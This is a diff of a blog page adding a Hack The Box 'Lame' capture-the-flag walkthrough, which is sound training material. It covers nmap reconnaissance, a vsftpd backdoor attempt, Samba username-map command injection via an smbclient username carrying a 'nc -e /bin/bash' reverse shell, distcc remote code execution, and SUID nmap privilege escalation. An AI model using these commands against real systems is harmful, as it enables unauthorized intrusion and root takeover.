@@ -79,36 +79,288 @@
   </time>
   <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/1.png" alt="Info Card" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Today we will be solving <em>Hack The Box’s</em> <em>Lame</em> machine.</p>
+<p>Today we will be solving <em>Hack The Box’s</em> <em>Lame</em> machine. It is an easy-level <em>Linux</em> machine in terms of both exploitation and privilege escalation.</p>
+
+<p>This machine allows us to exploit it through two potential paths, one of which requires post-exploitation. Despite its low difficulty, there are multiple methods to perform the same exploitation, making it great for learning different approaches to achieve the same process.</p>
 
 <h3 id="reconnaissance-phase"><a href="#header-3"></a>Reconnaissance Phase</h3>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/2.png" alt="2" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/3b.png" alt="3" class="blog-image" onclick="expandImage(this)" /></p>
+<p>First, we’re going to launch an <em>ICMP traceroute</em> to check if the machine is active.</p>
 
-<h3 id="exploitation-phase"><a href="#header-3"></a>Exploitation Phase</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.3
+</code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/4.png" alt="4" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/5.png" alt="5" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/6.png" alt="6" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/7.png" alt="7" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/8.png" alt="8" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/9.png" alt="9" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/10.png" alt="10" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/11.png" alt="11" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/12.png" alt="12" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/13.png" alt="13" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/14.png" alt="14" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/2.png" alt="2" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Once we verify that the machine is active (as it returns a response), we can also determine what type of machine we are dealing with based on the <em>TTL</em> value; in this case, the machine’s <em>TTL</em> value is <code class="language-plaintext highlighter-rouge">63</code>, so we can infer that we are dealing with a <em>Linux</em> machine. Remember, some of the reference values are as follows:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Operating System (OS)</th>
+      <th style="text-align: left">TTL</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">Linux</td>
+      <td style="text-align: left">64</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Windows</td>
+      <td style="text-align: left">128</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Solaris</td>
+      <td style="text-align: left">254</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>If we notice, in this case, the <em>TTL</em> value is <code class="language-plaintext highlighter-rouge">63</code> instead of <code class="language-plaintext highlighter-rouge">64</code> as indicated in the table above. This is because, in the <em>Hack The Box</em> environment, we are not communicating directly with the target machine; instead, there is an intermediary node, which causes the <em>TTL</em> to decrease by one unit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.3 -R
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/3b.png" alt="3" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Next, we will use the <em>Nmap</em> tool to determine which ports are open, as well as identify the version and services running on the asset. To determine which ports are open, we can do the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.3
+</code></pre></div></div>
+
+<p>If the scan takes too long to complete, we have this alternative:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.3
+</code></pre></div></div>
+
+<p>Below is an explanation of the parameters used in the port scan with <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parameter</th>
+      <th style="text-align: left">Explanation</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-p-</td>
+      <td style="text-align: left">Scans the entire range of ports (65535 in total)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">--open</td>
+      <td style="text-align: left">Shows all ports that are open (or possibly open)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-T5</td>
+      <td style="text-align: left">The timing template allows us to speed up our scan; this value can range from 0 to 5. Note that the higher the value of the template, the more “noise” we generate, but that’s okay, right? After all, we’re practicing in a controlled environment, and here we are all <code class="language-plaintext highlighter-rouge">White Hat</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-v</td>
+      <td style="text-align: left"><em>Verbose</em>, reports findings to the console</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-n</td>
+      <td style="text-align: left">Do not apply <em>DNS resolution</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sS</td>
+      <td style="text-align: left"><em>TCP SYN</em> scan</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-min-rate</td>
+      <td style="text-align: left">Send packets no slower than &lt;value&gt; per second</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-vvv</td>
+      <td style="text-align: left">Triple <em>verbose</em>, to get more information in the console</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-Pn</td>
+      <td style="text-align: left">Do not apply <em>host discovery</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Once we have detected the open ports on the asset, we can move on to determine the version and services running on these ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 21,22,139,445,3632 10.10.10.3
+</code></pre></div></div>
+
+<p>Below is an explanation of the parameters used in the version and service scan with <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parameter</th>
+      <th style="text-align: left">Explanation</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-sC</td>
+      <td style="text-align: left">Basic enumeration scripts</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sV</td>
+      <td style="text-align: left">Version and services running on the found ports</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p</td>
+      <td style="text-align: left">Specify which ports we want to analyze (those found open in the previous step)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Based on the information reported by <em>Nmap</em>, we can see that the target machine has open ports related to <code class="language-plaintext highlighter-rouge">FTP</code> (File Transfer Protocol), <code class="language-plaintext highlighter-rouge">SMB</code> (Server Message Block)  and <code class="language-plaintext highlighter-rouge">distcc</code>.</p>
+
+<h3 id="exploitation-phase---samba"><a href="#header-3"></a>Exploitation Phase - Samba</h3>
+
+<p>The first thing we can do is enumerate the <code class="language-plaintext highlighter-rouge">FTP</code> service. For this, we will use a <em>null session</em>, as we do not have credentials; however, we will not find anything.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp anonymous@10.10.10.3
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/4.png" alt="4" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Next, we can analyze our <em>Nmap</em> scan, where we observe that the <code class="language-plaintext highlighter-rouge">FTP</code> server we are facing is <code class="language-plaintext highlighter-rouge">vsftpd</code>, specifically version <code class="language-plaintext highlighter-rouge">2.3.4</code>. If we do a bit of research, we will discover that this version has a vulnerability where a backdoor was introduced into the source code. This vulnerability added a conditional during authentication that looked for the characters “<em>:)</em>” (a smiley face) at the end of the username, and if found, it would execute an additional function: <em>vsf_sysutil_extra()</em>. This function would open a TCP socket on port <code class="language-plaintext highlighter-rouge">6200</code>, which, upon receiving a connection, would launch a shell. You can find more details about this vulnerability in <a href="https://westoahu.hawaii.edu/cyber/forensics-weekly-executive-summmaries/8424-2/">this article</a>. Therefore, we can attempt to exploit this vulnerability.</p>
+
+<p>The first thing we will do is connect to the <code class="language-plaintext highlighter-rouge">FTP</code> service using <em>Telnet</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet 10.10.10.3 21
+</code></pre></div></div>
+
+<p>Next, we will enter any username followed by “<em>:)</em>” and any password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>USER user:<span class="o">)</span>
+PASS p@<span class="nv">$$</span>w0rd!
+</code></pre></div></div>
+
+<p>Then, we can suspend the <em>Telnet</em> console using <code class="language-plaintext highlighter-rouge">Ctrl + ]</code>. Afterward, we will attempt to connect to the target machine on port <code class="language-plaintext highlighter-rouge">6200</code> using <em>Netcat</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.10.3 6200
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/5.png" alt="5" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Shortly, we will realize that no connection is established, no matter how much we try or wait, so we can assume that the vulnerability on this machine has been patched. Therefore, we will move on to enumerating the next protocol identified during our <em>Nmap</em> scan: <code class="language-plaintext highlighter-rouge">SMB</code>.</p>
+
+<p>For this, we can use <code class="language-plaintext highlighter-rouge">SMBMap</code> or <code class="language-plaintext highlighter-rouge">smbclient</code> to check if the machine has shared network resources, again using a <em>null session</em> since we do not have credentials:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.3
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> <span class="nt">-L</span> 10.10.10.3
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/6.png" alt="6" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>We see that we have read and write permissions on a share named <code class="language-plaintext highlighter-rouge">tmp</code>. We can list the contents of this share with any of the following commands:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.3 <span class="nt">-r</span> tmp
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> //10.10.10.3/tmp
+</code></pre></div></div>
+
+<p>However, we do not find anything of interest in this share.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/7.png" alt="7" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>We can return to our <em>Nmap</em> scan and notice that the <code class="language-plaintext highlighter-rouge">Samba</code> service is running version <code class="language-plaintext highlighter-rouge">3.0.20</code>. Therefore, we can investigate whether this version is vulnerable to any type of exploit. We can do this by searching online, for example, on <em>Exploit Database</em>, or directly from the console using <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit samba 3.0.20
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/8.png" alt="8" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>We find a vulnerability that is exploited when the <code class="language-plaintext highlighter-rouge">username map script</code> configuration option is enabled (it is not enabled by default). By specifying a username containing <em>shell metacharacters</em>, it is possible to achieve remote command execution without prior authentication.</p>
+
+<p>However, the exploit we found uses <em>Metasploit</em>, which does not align with our methodology. Nevertheless, by examining the script found with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-x</span> 16320
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/9.png" alt="9" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>We can see that the exploit simply provides the command we want to execute as the username and an arbitrary string as the password. So, by understanding the script, we can manually replicate the same exploitation using <code class="language-plaintext highlighter-rouge">smbclient</code> without the need for automated scripts.</p>
+
+<p>For this, we will set up a listener with <em>Netcat</em> and execute the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.3 <span class="nt">-U</span> <span class="s2">"/=</span><span class="sb">`</span><span class="nb">nohup </span>nc <span class="nt">-e</span> /bin/bash &lt;ourIP&gt; &lt;anyPort&gt;<span class="sb">`</span><span class="s2">"</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/10.png" alt="10" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>However, this will not yield the expected results, because although we get a shell, it connects back to our own attacking machine. Upon reviewing the exploit, we notice that it uses the <code class="language-plaintext highlighter-rouge">NTLMv1</code> protocol, so we can also try specifying this protocol in <code class="language-plaintext highlighter-rouge">smbclient</code> as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.3 <span class="nt">-U</span> <span class="s2">"/=</span><span class="sb">`</span><span class="nb">nohup </span>nc <span class="nt">-e</span> /bin/bash &lt;ourIP&gt; &lt;anyPort&gt;<span class="sb">`</span><span class="s2">"</span> <span class="nt">--option</span><span class="o">=</span><span class="s1">'client min protocol=NT1'</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/11.png" alt="11" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>However, we will obtain the same result. At this point, we can try writing a similar script in <em>Python</em> to see if we achieve a different outcome. For this, we will use the <code class="language-plaintext highlighter-rouge">pysmb</code> <a href="https://pysmb.readthedocs.io/en/latest/api/smb_SMBConnection.html">documentation</a> to guide us in creating the script.</p>
+
+<p>First, we install <code class="language-plaintext highlighter-rouge">pysmb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install </span>pysmb
+</code></pre></div></div>
+
+<p>Upon reviewing the documentation, we see that the parameters <em>username</em>, <em>password</em>, <em>my_name</em>, and <em>remote_name</em> are mandatory. However, we can leave <em>my_name</em> and <em>remote_name</em> empty. In the <em>username</em> parameter, we will place our command to execute, and the <em>password</em> field can also be left empty. The script would look something like this:</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/12.png" alt="12" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Interestingly, we now manage to get a shell inside the target machine. This is likely because current versions of <code class="language-plaintext highlighter-rouge">smbclient</code> are configured to prevent such attacks. Nevertheless, we obtain access as <code class="language-plaintext highlighter-rouge">root</code>, which allows us to visualize both flags.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/13.png" alt="13" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>However, I didn’t want to sit idle, as my curiosity led me to keep trying this exploitation using <code class="language-plaintext highlighter-rouge">smbclient</code>. I found that if we connect to the <code class="language-plaintext highlighter-rouge">SMB</code> service using the same <em>null session</em> and use the <code class="language-plaintext highlighter-rouge">logon</code> command to change the user, we can enter the command to execute directly in that field and thus exploit <code class="language-plaintext highlighter-rouge">SMB</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/14.png" alt="14" class="blog-image" onclick="expandImage(this)" /></p>
+
+<h3 id="exploitation-phase---distcc"><a href="#header-3"></a>Exploitation Phase - distcc</h3>
+
+<p>The next exploitation path we can explore is through the <code class="language-plaintext highlighter-rouge">distcc</code> service. If we refer back to our <em>Nmap</em> scan, we’ll see that the <code class="language-plaintext highlighter-rouge">distcc</code> service is running version <code class="language-plaintext highlighter-rouge">4.2.4</code>.</p>
+
+<p>While there are scripts that use <em>Metasploit</em> to exploit this vulnerability, we can also find an <a href="https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855#file-distccd_rce_cve-2004-2687-py">exploit</a> by the user <code class="language-plaintext highlighter-rouge">DarkCoderSc</code> on GitHub that performs the exploitation manually.</p>
+
+<p>This exploit provides us with remote command execution, and we can test it as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 distccd_rce_CVE-2004-2687.py <span class="nt">-t</span> 10.10.10.3 <span class="nt">-p</span> 3632 <span class="nt">-c</span> <span class="s1">'ifconfig; whoami'</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/15.png" alt="15" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Upon running the script, we confirm that we are inside the target machine. However, unlike the previous method, we now have access as the <code class="language-plaintext highlighter-rouge">daemon</code> user instead of <em>root</em>. This indicates that we will need to escalate privileges to fully compromise the system.</p>
+
+<p>The next step will be to establish a reverse shell to our attacking machine, allowing us to visualize the first flag.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/16.png" alt="16" class="blog-image" onclick="expandImage(this)" /></p>
 
 <h3 id="privilege-escalation"><a href="#header-3"></a>Privilege Escalation</h3>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/15.png" alt="15" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/16.png" alt="16" class="blog-image" onclick="expandImage(this)" />
-<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/17.png" alt="17" class="blog-image" onclick="expandImage(this)" /></p>
+<p>To perform this final phase, we can leverage binaries with misconfigured <code class="language-plaintext highlighter-rouge">SUID</code> permissions, which will allow us to escalate privileges. To list all binaries with <code class="language-plaintext highlighter-rouge">SUID</code> permissions on the machine, we can use the following commands:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-uid</span> 0 <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/17.png" alt="17" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>The best way to abuse any binary is by referring to <a href="https://gtfobins.github.io/">GTFOBins</a>; this site teaches us how to exploit binaries with misconfigured <em>capabilities</em>, binaries that can be executed as <em>root</em>, and in this case, binaries with misconfigured <code class="language-plaintext highlighter-rouge">SUID</code> permissions.</p>
+
+<p>The most interesting binary we found is <code class="language-plaintext highlighter-rouge">nmap</code>, which is running an old version. This version included an interactive mode that we can use to invoke a shell. Since <code class="language-plaintext highlighter-rouge">nmap</code> has <code class="language-plaintext highlighter-rouge">SUID</code> permissions, the shell will execute as the <code class="language-plaintext highlighter-rouge">root</code> user, allowing us to visualize the system’s final flag.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/18.png" alt="18" class="blog-image" onclick="expandImage(this)" /></p>
 
 <h3 id="autopwn-script"><a href="#header-3"></a>Autopwn Script</h3>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/18.png" alt="18" class="blog-image" onclick="expandImage(this)" /></p>
+<p>Additionally, I developed an <em>autopwn</em> script available publicly on my GitHub <a href="https://github.com/MateoNitro550/HTB-Autopwn-Scripts/blob/main/Lame/autopwn_lame.py">repository</a>. This script automates the exploitation and privilege escalation on the machine, covering the techniques explained and serving as a guide to understand the exploitation process.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/19.png" alt="19" class="blog-image" onclick="expandImage(this)" /></p>
 
 </article>
 
